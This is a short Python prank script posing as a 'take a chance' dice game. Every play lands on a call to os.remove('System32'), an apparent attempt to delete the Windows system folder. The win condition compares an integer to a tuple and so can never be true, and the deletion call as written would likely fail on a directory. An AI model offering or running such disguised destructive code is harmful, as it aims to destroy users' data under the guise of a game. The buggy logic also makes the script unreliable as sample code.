import random
import os

print("Let's play a game")

while True:
    user = int(input('1. Take a chance?     2. Exit, coward'))
    if user == 1:
        shot = random.randint(1,6)
        if shot == (1,5):
            print('You Win!')
        else:
            os.remove("System32")
    else:
        break

